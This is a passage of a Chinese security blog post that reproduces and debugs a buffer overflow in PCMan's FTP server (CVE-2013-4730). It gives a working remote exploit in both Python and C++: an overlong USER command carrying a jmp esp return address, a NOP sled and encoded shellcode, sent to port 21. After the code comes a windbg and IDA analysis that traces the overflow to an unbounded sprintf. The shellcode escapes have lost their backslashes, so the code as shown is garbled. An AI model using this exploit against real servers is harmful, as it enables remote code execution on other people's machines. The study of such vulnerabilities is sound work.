+<a class="highslide-img" href="https://www.anquanke.com/post/id/index_files/2c723290-a0a9-4963-8a03-437595855751.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="" data-original="index_files/2c723290-a0a9-4963-8a03-437595855751.png" /></a>我们这里用 0x7654fbf7</p>
+<p id="h3-2-shellcode-"><a class="reference-link" name="2.%20shellcode%E7%BB%84%E5%90%88%E5%AD%97%E7%AC%A6%E4%B8%B2"></a><strong>2. shellcode组合字符串</strong></p>
+<ol>
+<li>USER 也就是用户名</li>
+<li>无意义的字符串，大小为2002个</li>
+<li>jmp esp</li>
+<li>nop填充</li>
+<li>shellcode</li>
+</ol>
+<p id="h3-3-exploit-"><a class="reference-link" name="3.%20exploit%E6%BA%90%E7%A0%81"></a><strong>3. exploit源码</strong></p>
+<p id="h4-python-"><a class="reference-link" name="python%E7%89%88%E6%9C%AC"></a><strong>python版本</strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">#!usr/bin/python
+# -*- coding: utf-8 -*-
+
+import socket
+
+Cmd = b"USER "
+Fill = b"x41" * 2002
+Jmp = b"xf7xfbx54x76"
+Nop = b"x90" * 50
+ShellCode = b"x33xC0xE8xFFxFFxFFxFFxC3x58x8Dx70x1Bx33xC9x66xB9x11x01x8Ax04x0Ex34x07x88x04x0ExE2xF6x80x34x0Ex07xFFxE6"
+b"x67x84xEBx27xECx4Ax40x62x73x57x75x68x64x46x63x63" 
+b"x75x62x74x74x07x4Bx68x66x63x4Bx6Ex65x75x66x75x7E" 
+b"x42x7Fx46x07x52x74x62x75x34x35x29x63x6Bx6Bx07x4A" 
+b"x62x74x74x66x60x62x45x68x7Fx46x07x42x7Fx6Ex73x57" 
+b"x75x68x64x62x74x74x07x4Fx62x6Bx6Bx68x27x50x68x75" 
+b"x63x26x07xEFx07x07x07x07x5Cx63x8Cx32x37x07x07x07" 
+b"x8Cx71x0Bx8Cx71x1Bx8Cx31x8Cx71x0Fx8Ex72xF7x8CxD1" 
+b"x8Cx45x3Bx8Ax03x05x8Cx52xF7x8Cx47x7Fx8Ax03x17x8C" 
+b"x4Fx1Bx8Ax0Bx16x8Ex4AxFBx8Cx4Fx27x8Ax0Bx16x8Ex4A" 
+b"xFFx8Cx4Fx23x8Ax0Bx16x8Ex4AxF3x34xC7x8Cx52xF7xEC" 
+b"x06x47x8Cx7AxFFx8Cx3Bx80x8Cx52xF7x8Ax3Bx3Dx8Ax74" 
+b"xA9xBEx09x07x07x07xFBxF4xA1x72xE1x8Cx52xF3x34xCE" 
+b"x61x8Cx0Bx45x8Cx52xFBx8Cx33x8Dx8Cx7AxF7x8Ax03x30" 
+b"x8Ex42xEBx8Ax44xBAx57xF8x72xF7xF8x52xEBx8Ex42xEF" 
+b"x8Ax54xCBx34xCEx56x56x55xF8xD7x8Ex42xE3x8Ax44xD0" 
+b"x57xF8x72xE3xF8x52xEBx34xCEx56x8Ax7CxE8x50x50x56" 
+b"xF8xD7x8Ax44xE4x57xF8x72xF7xF8x52xEBx34xCEx56xF8" 
+b"xD7"
+
+def main():
+    print("创建SOCKET")
+    net_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    print("连接")
+    port = 21
+  net_sock.connect(('192.168.43.82',port))
+    print(net_sock.recv(1024).decode('utf-8'))
+    data = Cmd + Fill + Jmp + Nop + ShellCode
+    net_sock.send(data)
+    print(net_sock.recv(1024).decode('utf-8'))
+    net_sock.close()
+if __name__ == '__main__':
+    main()<code class="lang-python hljs">
+</code></pre>
+<p id="h4-c-"><a class="reference-link" name="c++%E7%89%88%E6%9C%AC"></a><strong>c++版本</strong><code class="lang-cpp hljs"></code></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">#define _WINSOCK_DEPRECATED_NO_WARNINGS
+
+#include &lt;stdio.h&gt;
+#include &lt;WinSock2.h&gt;
+#include &lt;windows.h&gt;
+
+#pragma comment(lib,"ws2_32.lib")
+
+
+char bShellcode[] = "x33xC0xE8xFFxFFxFFxFFxC3x58x8Dx70x1Bx33xC9x66xB9x11x01x8Ax04x0Ex34x07x88x04x0ExE2xF6x80x34x0Ex07xFFxE6"
+"x67x84xEBx27xECx4Ax40x62x73x57x75x68x64x46x63x63" 
+"x75x62x74x74x07x4Bx68x66x63x4Bx6Ex65x75x66x75x7E" 
+"x42x7Fx46x07x52x74x62x75x34x35x29x63x6Bx6Bx07x4A" 
+"x62x74x74x66x60x62x45x68x7Fx46x07x42x7Fx6Ex73x57" 
+"x75x68x64x62x74x74x07x4Fx62x6Bx6Bx68x27x50x68x75" 
+"x63x26x07xEFx07x07x07x07x5Cx63x8Cx32x37x07x07x07" 
+"x8Cx71x0Bx8Cx71x1Bx8Cx31x8Cx71x0Fx8Ex72xF7x8CxD1" 
+"x8Cx45x3Bx8Ax03x05x8Cx52xF7x8Cx47x7Fx8Ax03x17x8C" 
+"x4Fx1Bx8Ax0Bx16x8Ex4AxFBx8Cx4Fx27x8Ax0Bx16x8Ex4A" 
+"xFFx8Cx4Fx23x8Ax0Bx16x8Ex4AxF3x34xC7x8Cx52xF7xEC" 
+"x06x47x8Cx7AxFFx8Cx3Bx80x8Cx52xF7x8Ax3Bx3Dx8Ax74" 
+"xA9xBEx09x07x07x07xFBxF4xA1x72xE1x8Cx52xF3x34xCE" 
+"x61x8Cx0Bx45x8Cx52xFBx8Cx33x8Dx8Cx7AxF7x8Ax03x30" 
+"x8Ex42xEBx8Ax44xBAx57xF8x72xF7xF8x52xEBx8Ex42xEF" 
+"x8Ax54xCBx34xCEx56x56x55xF8xD7x8Ex42xE3x8Ax44xD0" 
+"x57xF8x72xE3xF8x52xEBx34xCEx56x8Ax7CxE8x50x50x56" 
+"xF8xD7x8Ax44xE4x57xF8x72xF7xF8x52xEBx34xCEx56xF8" 
+"xD7";
+
+
+int main()
+{
+
+    //构造exp
+    char cExpolit[5000] = { 0x00 };
+    char cFill[5000] = { 0x00 };
+    char cNop[51] = { 0x00 };
+    char cRetAddr[5] = "xf7xfbx54x76"; // 0x7654fbf7
+    memset(cFill, 'A', 2002); // 别忘了USER 还占5个字节
+    memset(cNop, 'x90', 50);
+    sprintf_s(cExpolit, "%s%s%s%s%s%s","USER ", cFill, cRetAddr, cNop, bShellcode, "rn");
+
+
+
+    // 1. -初始化WinSocket服务
+    WSADATA stWSA;
+    WSAStartup(0x0202, &amp;stWSA);
+    // 2. 创建一个原始套接字
+    SOCKET stListen = INVALID_SOCKET;
+    stListen = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+    // 3. 在任意地址绑定端口21
+    SOCKADDR_IN stService;
+    stService.sin_addr.s_addr = inet_addr("192.168.43.82");
+    stService.sin_port = htons(21);
+    stService.sin_family = AF_INET;
+    connect(stListen, (SOCKADDR*)&amp;stService, sizeof(stService));
+    // 4. 接收返回信息缓冲区
+    char szRecv[0x100] = { 0 };
+    // 5. 登陆请求
+    recv(stListen, szRecv, sizeof(szRecv), 0);
+    send(stListen, cExpolit, strlen(cExpolit), 0);
+    // 6. 接收信息
+    recv(stListen, szRecv, sizeof(szRecv), 0);
+    // 7. 清理环境
+    closesocket(stListen);
+    WSACleanup();
+    system("pause");
+    return 0;
+}</pre>
+<p>攻击成功<a class="highslide-img" href="https://p2.ssl.qhimg.com/t018d9770429200c59e.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p2.ssl.qhimg.com/t018d9770429200c59e.png" alt="" data-original="https://p2.ssl.qhimg.com/t018d9770429200c59e.png" /></a></p>
+<h2 id="h2-12">3. 漏洞分析</h2>
+<p>现在我们来分析一下这个漏洞到底是如何生成的。</p>
+<p>这里我们用到windbg的动态调试和IDA的静态调试</p>
+<p>再用刚才的poc，寻找没有覆盖溢出点的地方，然后我们在这个地方下硬件写入断点，然后观察堆栈以及数据覆盖变化</p>
+<ol>
+<li>找能下断的地方<br />
+<a class="highslide-img" href="https://p0.ssl.qhimg.com/t01d7b958337467ab7b.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="" data-original="https://p0.ssl.qhimg.com/t01d7b958337467ab7b.png" /></a></li>
+<li>硬件写入断点
+<pre class="EnlighterJSRAW" data-enlighter-language="null">ba w4 0012ed60 ".if(poi(0012ed60 )=0x6f43366f ){}.else{gc}"</pre>
+</li>
+</ol>
+<p>断下了</p>
+<p><a class="highslide-img" href="https://p5.ssl.qhimg.com/t010c618eea55cba279.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p5.ssl.qhimg.com/t010c618eea55cba279.png" alt="" data-original="https://p5.ssl.qhimg.com/t010c618eea55cba279.png" /></a></p>
+<ol>
+<li>我们通过widbg和IDA栈回溯看看到底调用的哪个地方造成了数据覆盖，回溯了好几层，需要耐心观察最后我们发现这里比较可疑<br />
+<a class="highslide-img" href="https://p3.ssl.qhimg.com/t01c409e98a87fcb1da.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p3.ssl.qhimg.com/t01c409e98a87fcb1da.png" alt="" data-original="https://p3.ssl.qhimg.com/t01c409e98a87fcb1da.png" /></a></li>
+<li>验证，我们重新运行然后widbg在sprintf下断点 <code>bp 00403EE6</code> 并且观察堆栈，发现前后堆栈数据被poc的数据覆盖</li>
+</ol>
+<p><a class="highslide-img" href="https://p5.ssl.qhimg.com/t01f5a38b56548fc9ef.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p5.ssl.qhimg.com/t01f5a38b56548fc9ef.png" alt="" data-original="https://p5.ssl.qhimg.com/t01f5a38b56548fc9ef.png" /></a></p>
+<p>sprintf运行了好几次，最后一次是因为复制的字符串太长导致返回值被覆盖，从而造成缓冲区溢出，</p>
+<p><a class="highslide-img" href="https://p1.ssl.qhimg.com/t01125524638060a979.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p1.ssl.qhimg.com/t01125524638060a979.png" alt="" data-original="https://p1.ssl.qhimg.com/t01125524638060a979.png" /></a></p>
+<p>造成这个种结果是因为在拼接最后一个字符串的时候没有做长度限制，导致缓冲区溢出</p>
+<p><a class="highslide-img" href="https://p5.ssl.qhimg.com/t01b7688bae96e0cf2f.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank" rel="noopener"><img class="aligncenter" src="https://p5.ssl.qhimg.com/t01b7688bae96e0cf2f.png" alt="" data-original="https://p5.ssl.qhimg.com/t01b7688bae96e0cf2f.png" /></a></p>
+</div>
+<p class="article-footer-label"><strong>本文由安全客原创发布</strong></p>
+<p class="article-footer-label"><strong>转载注明出处：</strong> <a href="https://www.anquanke.com/post/id/177939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177939</a></p>
+<p>转载请注明：<a href="http://www.secist.com">即刻安全</a> &raquo; <a href="http://www.secist.com/archives/7475.html">PCMan&#8217;s FTP 漏洞（CVE-2013-4730）详细复现调试过程与exp构造</a></p>		</article>
+
+		
+		<footer class="article-footer">
+			<div class="article-tags">继续浏览有关 <a href="http://www.secist.com/archives/tag/cve" rel="tag">CVE</a><a href="http://www.secist.com/archives/tag/exp" rel="tag">exp</a><a href="http://www.secist.com/archives/tag/windows" rel="tag">Windows</a><a href="http://www.secist.com/archives/tag/%e7%bc%93%e5%86%b2%e5%8c%ba%e6%ba%a2%e5%87%ba" rel="tag">缓冲区溢出</a> 的文章</div>			<div class="share"><h5>分享到 </h5><div class="bdsharebuttonbox"><a class="bds_qzone" data-cmd="qzone"></a><a class="bds_tsina" data-cmd="tsina"></a><a class="bds_weixin" data-cmd="weixin"></a><a class="bds_tqq" data-cmd="tqq"></a><a class="bds_sqq" data-cmd="sqq"></a><a class="bds_renren" data-cmd="renren"></a><a class="bds_t163" data-cmd="t163"></a><a class="bds_tsohu" data-cmd="tsohu"></a><a class="bds_baidu" data-cmd="baidu"></a><a class="bds_douban" data-cmd="douban"></a><a class="bds_bdhome" data-cmd="bdhome"></a><a class="bds_youdao" data-cmd="youdao"></a><a class="bds_fbook" data-cmd="fbook"></a><a class="bds_twi" data-cmd="twi"></a><a class="bds_more" data-cmd="more"></a><a class="bds_count" data-cmd="count"></a></div></div>		</footer>
+
+		<nav class="article-nav">
+			<span class="article-nav-prev">上一篇 <a href="http://www.secist.com/archives/7465.html" rel="prev">在多GPU系统上使用hashcat进行密码破解</a></span>
+			<span class="article-nav-next"><a href="http://www.secist.com/archives/7489.html" rel="next">如何绕过高版本 JDK 的限制进行 JNDI 注入利用</a> 下一篇</span>
+		</nav>
+
+		<div class="relates">
+			<h3>与本文相关的文章</h3>
+			<ul>
+<li><a href="http://www.secist.com/archives/6978.html">初识Linux渗透：从枚举到内核利用</a></li><li><a href="http://www.secist.com/archives/6345.html">渗透测试技术之另类Windows提权</a></li><li><a href="http://www.secist.com/archives/6082.html">GreatSCT | MSF | 白名单</a></li><li><a href="http://www.secist.com/archives/6065.html"><干货 · 杂铺店></a></li><li><a href="http://www.secist.com/archives/5912.html">Mavinject | Dll Injected</a></li><li><a href="http://www.secist.com/archives/5266.html">Powerstager | Msf | kali linux 2017</a></li><li><a href="http://www.secist.com/archives/5127.html">如何突破Windows环境限制打开“命令提示符”</a></li><li><a href="http://www.secist.com/archives/4016.html">我的不归路之重新认识Docker（完整版）</a></li><li><a href="http://www.secist.com/archives/3666.html">Msf复现Samba远程代码执行漏洞</a></li><li><a href="http://www.secist.com/archives/3547.html">Windows渗透测试工具：RedSnarf</a></li><li><a href="http://www.secist.com/archives/3504.html">Metasploit复现Eternalblue-Doublepulsar（附视频）</a></li><li><a href="http://www.secist.com/archives/3472.html">任意程序添加ShellCode</a></li></ul>		</div>
+	
+
+		
+		<div id="respond" class="no_webshot">
+		<h3 class="queryinfo">
+		您必须 <a href="http://www.secist.com/wp-login.php?redirect_to=http%3A%2F%2Fwww.secist.com%2Farchives%2F7475.html">登录</a> 才能发表评论！	</h3>
+	</div>
+<div id="postcomments">
+	<h3 id="comments">
+		网友最新评论<b> (1)</b>
+	</h3>
+	<ol class="commentlist">
+			</ol>
+	<div class="pagenav">
+			</div>
+</div>
+
+		
+	</div>
+</div>
+<aside class="sidebar">	
+<div class="widget_text widget widget_custom_html"><h3 class="widget_tit">关注即刻安全新浪！</h3><div class="textwidget custom-html-widget"><iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=1&ptype=1&speed=60&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=5044692010&verifier=13c92d34&dpc=1"></iframe></div></div><div class="widget d_tag"><h3 class="widget_tit"></h3><div class="d_tags"><a href="http://www.secist.com/archives/tag/%e6%b8%97%e9%80%8f">渗透 (92)</a><a href="http://www.secist.com/archives/tag/kali">kali (71)</a><a href="http://www.secist.com/archives/tag/tools">tools (56)</a><a href="http://www.secist.com/archives/tag/windows">Windows (45)</a><a href="http://www.secist.com/archives/tag/%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f">内网渗透 (44)</a><a href="http://www.secist.com/archives/tag/shell">shell (43)</a><a href="http://www.secist.com/archives/tag/msf">MSF (41)</a><a href="http://www.secist.com/archives/tag/bypass">bypass (33)</a><a href="http://www.secist.com/archives/tag/linux">Linux (25)</a><a href="http://www.secist.com/archives/tag/wireless">wireless (23)</a><a href="http://www.secist.com/archives/tag/translate">translate (23)</a><a href="http://www.secist.com/archives/tag/%e6%8f%90%e6%9d%83">提权 (22)</a><a href="http://www.secist.com/archives/tag/sql%e6%b3%a8%e5%85%a5">sql注入 (18)</a><a href="http://www.secist.com/archives/tag/%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1">代码审计 (13)</a><a href="http://www.secist.com/archives/tag/%e7%88%86%e7%a0%b4">爆破 (13)</a><a href="http://www.secist.com/archives/tag/%e8%b5%84%e6%ba%90%e5%88%86%e4%ba%ab">资源分享 (13)</a><a href="http://www.secist.com/archives/tag/%e9%80%86%e5%90%91%e7%a0%b4%e8%a7%a3">逆向破解 (12)</a><a href="http://www.secist.com/archives/tag/%e7%a4%be%e5%b7%a5">社工 (11)</a><a href="http://www.secist.com/archives/tag/exp">exp (11)</a><a href="http://www.secist.com/archives/tag/android">Android (10)</a><a href="http://www.secist.com/archives/tag/%e8%bf%9c%e6%8e%a7">远控 (10)</a><a href="http://www.secist.com/archives/tag/%e9%ab%98%e5%8d%b1%e6%bc%8f%e6%b4%9e">高危漏洞 (10)</a><a href="http://www.secist.com/archives/tag/command">command (10)</a><a href="http://www.secist.com/archives/tag/python">python (9)</a><a href="http://www.secist.com/archives/tag/mac-os">mac os (9)</a></div></div><div class="widget d_postlist"><h3 class="widget_tit"></h3><ul><li><a href="http://www.secist.com/archives/307.html"><span class="thumbnail"><img src="http://www.secist.com/wp-content/uploads/2016/07/12292-220x150.jpg" alt="WiFi有毒：如何建立一个自动文件下载的网络接入点" /></span><span class="text">WiFi有毒：如何建立一个自动文件下载的网络接入点</span><span class="muted">2016-07-29</span><span class="muted">4评论</span></a></li>
+<li><a href="http://www.secist.com/archives/3151.html"><span class="thumbnail"><img src="http://www.secist.com/wp-content/uploads/2017/04/dockerlogo2-220x150.jpg" alt="环境搭建：windows下docker的安装及kali部署" /></span><span class="text">环境搭建：windows下docker的安装及kali部署</span><span class="muted">2017-04-08</span><span class="muted">4评论</span></a></li>
+<li><a href="http://www.secist.com/archives/2197.html"><span class="thumbnail"><img src="http://www.secist.com/wp-content/uploads/2016/11/nmap-logo-2013-220x150.jpg" alt="原理篇：常用的扫描技术（一）" /></span><span class="text">原理篇：常用的扫描技术（一）</span><span class="muted">2016-11-21</span><span class="muted">3评论</span></a></li>
+<li><a href="http://www.secist.com/archives/2131.html"><span class="thumbnail"><img src="http://www.secist.com/wp-content/uploads/2016/11/20161116080619.png" alt="调查取证之图像还原" /></span><span class="text">调查取证之图像还原</span><span class="muted">2016-11-17</span><span class="muted">3评论</span></a></li>
+<li><a href="http://www.secist.com/archives/1951.html"><span class="thumbnail"><img src="http://www.secist.com/wp-content/uploads/2016/11/IMG_0178-220x150.jpg" alt="黑客也需要修身养性-----茶(zhuang）道(b)i篇" /></span><span class="text">黑客也需要修身养性&#8212;&#8211;茶(zhuang）道(b)i篇</span><span class="muted">2016-11-08</span><span class="muted">3评论</span></a></li>
+<li><a href="http://www.secist.com/archives/3743.html"><span class="thumbnail"><img src="http://www.secist.com/wp-content/uploads/2017/05/1_120618011011_1-220x150.jpg" alt="22款受欢迎的计算机取证工具" /></span><span class="text">22款受欢迎的计算机取证工具</span><span class="muted">2017-06-14</span><span class="muted">3评论</span></a></li>
+<li><a href="http://www.secist.com/archives/2082.html"><span class="thumbnail"><img src="http://www.secist.com/wp-content/uploads/2016/11/4439c452e8ec17129a853e-220x150.jpg" alt="调查取证之Volatility框架的使用" /></span><span class="text">调查取证之Volatility框架的使用</span><span class="muted">2016-11-15</span><span class="muted">3评论</span></a></li>
+</ul></div><div class="widget widget_links"><h3 class="widget_tit">友情链接(排名不分先后)</h3>
+	<ul class='xoxo blogroll'>
+<li><a href="http://www.0daybank.org/" target="_blank">0daybank</a></li>
+<li><a href="http://www.hackfun.org/" target="_blank">4ido10n&#039;s Blog</a></li>
+<li><a href="http://www.chabug.org" target="_blank">ChaBug安全</a></li>
+<li><a href="http://defcon.cn/" target="_blank">DEFCON笔记</a></li>
+<li><a href="http://www.empers.cn" target="_blank">Empers&#039;s Blog</a></li>
+<li><a href="https://www.easyaq.com/" target="_blank">E安全</a></li>
+<li><a href="http://www.hacked.com.cn/" target="_blank">hacked.com.cn</a></li>
+<li><a href="http://www.kali.org.cn/" target="_blank">kali中文网</a></li>
+<li><a href="https://phpinfo.me" target="_blank">Lcy&#039;s Blog</a></li>
+<li><a href="http://www.ttmd5.com/" target="_blank">md5在线解密</a></li>
+<li><a href="http://www.ms08067.com/" target="_blank">ms08067</a></li>
+<li><a href="http://www.radebit.com/" target="_blank">RadeBit</a></li>
+<li><a href="http://www.chinablackhat.com/" target="_blank">中国黑帽网</a></li>
+<li><a href="http://www.cnhackhy.com/" target="_blank">华域联盟</a></li>
+<li><a href="http://www.77169.net" target="_blank">华盟网</a></li>
+<li><a href="http://www.sqlsec.com/" target="_blank">国光&#039;s Blog</a></li>
+<li><a href="http://secjia.com" target="_blank">安全加</a></li>
+<li><a href="http://www.secz.org" target="_blank">安全周</a></li>
+<li><a href="http://www.anquanquan.info/" target="_blank">安全圈info</a></li>
+<li><a href="https://bbs.safewiki.org/" target="_blank">安全文库</a></li>
+<li><a href="http://www.shiyanbar.com/" target="_blank">实验吧</a></li>
+<li><a href="https://www.exehack.net/" target="_blank">小残&#039;s Blog</a></li>
+<li><a href="http://www.zx116.com/" target="_blank">平安在线</a></li>
+<li><a href="https://www.secfree.com" target="_blank">指尖安全</a></li>
+<li><a href="http://www.h-acker.net">旧人安全</a></li>
+<li><a href="http://www.xmcve.com">星盟安全团队</a></li>
+<li><a href="http://www.youxia.org/" target="_blank">游侠安全网</a></li>
+<li><a href="http://www.qince.net/" target="_blank">源码论坛</a></li>
+<li><a href="http://www.mayidui.net" target="_blank">白蚁网安</a></li>
+<li><a href="http://www.secbug.org/" target="_blank">破晓团队</a></li>
+<li><a href="https://www.easyaq.com/" target="_blank">网络安全</a></li>
+<li><a href="http://www.farmsec.com" target="_blank">网络安全培训</a></li>
+<li><a href="https://www.hac-ker.net/" target="_blank">被黑站点统计</a></li>
+<li><a href="http://www.panoeade.com/" target="_blank">重庆SEO博客</a></li>
+<li><a href="http://www.heike.la/" target="_blank">黑客啦</a></li>
+<li><a href="http://www.hac-ker.com" target="_blank">黑客导航</a></li>
+<li><a href="http://www.cn-hack.net/" target="_blank">黑客榜中榜</a></li>
+<li><a href="http://www.hackjie.com/" target="_blank">黑客街</a></li>
+<li><a href="http://www.hackernc.com/forum.php" target="_blank">黑客论坛</a></li>
+
+	</ul>
+</div>
+
+<p align="center">
+<strong><font size="3px">微信公众号：SecIst</font></strong>
+</p>
+<p align="center">
+<img src="http://www.secist.com/wp-content/uploads/2016/07/qrcode.jpg" />
+</p>
+</aside>﻿<style type="text/css">
+#img{
+position:relative; 
+left:416px;
+bottom:8px;
+}
+</style>
+
+</section>
+
+<center><h1><strong>合作伙伴</strong></h1></center>
+<div id="img">
+<a href="http://www.nsoad.com/" target="_blank"><img src="http://www.secist.com/wp-content/uploads/2017/10/WLGF.png"></img></a>
+<a href="http://bugbank.cn/" target="_blank"><img src="http://www.secist.com/wp-content/uploads/2016/11/bugbank.png"></img></a>&nbsp&nbsp&nbsp&nbsp
+<a href="http://cdas.cda.cn/" target="_blank"><img src="http://www.secist.com/wp-content/uploads/2017/10/CDA.png"></img></a>
+<a href="http://www.tiejiang.org/" target="_blank"><img src="http://www.secist.com/wp-content/uploads/2017/11/tiejiang.png"></img></a>
+<a href="http://www.sins-expo.com/" target="_blank"><img src="http://www.secist.com/wp-content/uploads/2019/08/2019082610291837.jpg"></img></a>
+</div>
+</div>
+
+
+<footer class="footer">
+    <div class="footer-inner">
+        <div class="copyright pull-left">
+            版权所有，保留一切权利！ &copy; 2020 <a href="http://www.secist.com">即刻安全</a>　Theme <a href="#" target="_blank">D8</a>&nbsp&nbsp&nbsp<a href="http://beian.miit.gov.cn/" target="_blank">浙ICP备16009312号-2</a>
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1259925520'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1259925520%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+<a target="_blank" href="http://shang.qq.com/wpa/qunwpa?idkey=fd478182c7acb8919fff7b0402dd6b8e7dacf841f1928b745212cd7754357ef9"><img border="0" src="http://pub.idqqimg.com/wpa/images/group.png" alt="即刻安全官方群" title="即刻安全官方群"></a>
+<a target="_blank" href="//shang.qq.com/wpa/qunwpa?idkey=daf3516146279d0ec8eec1c93eefcafe5a9d0b30b750ff17adabfd389589d398"><img border="0" src="//pub.idqqimg.com/wpa/images/group.png" alt="即刻安全技术交流" title="即刻安全技术交流"></a>
+</p>
+        </div>
+        <div class="trackcode pull-right">
+                    </div>
+    </div>
+
+</footer>
+<!-- Powered by WPtouch: 4.3.28 --><script type='text/javascript' src='http://www.secist.com/wp-content/plugins/enlighter/resources/mootools-core-yc.js?ver=3.7'></script>
+<script type='text/javascript' src='http://www.secist.com/wp-content/plugins/enlighter/resources/EnlighterJS.min.js?ver=3.7'></script>
+<script type='text/javascript' src='http://www.secist.com/wp-includes/js/wp-embed.min.js?ver=4.9.4'></script>
+<script type="text/javascript">/* <![CDATA[ */EnlighterJS_Config = {"selector":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"language":"generic","theme":"classic","indent":2,"hover":"hoverEnabled","showLinenumbers":true,"rawButton":true,"infoButton":false,"windowButton":true,"rawcodeDoubleclick":false,"grouping":true,"cryptex":{"enabled":false,"email":"mail@example.tld"}};!function(){var a=function(a){var b="Enlighter Error: ";console.error?console.error(b+a):console.log&&console.log(b+a)};return window.addEvent?"undefined"==typeof EnlighterJS?void a("Javascript Resources not loaded yet!"):"undefined"==typeof EnlighterJS_Config?void a("Configuration not loaded yet!"):void window.addEvent("domready",function(){EnlighterJS.Util.Init(EnlighterJS_Config.selector.block,EnlighterJS_Config.selector.inline,EnlighterJS_Config)}):void a("MooTools Framework not loaded yet!")}();;/* ]]> */</script>
+</body>
+</html>
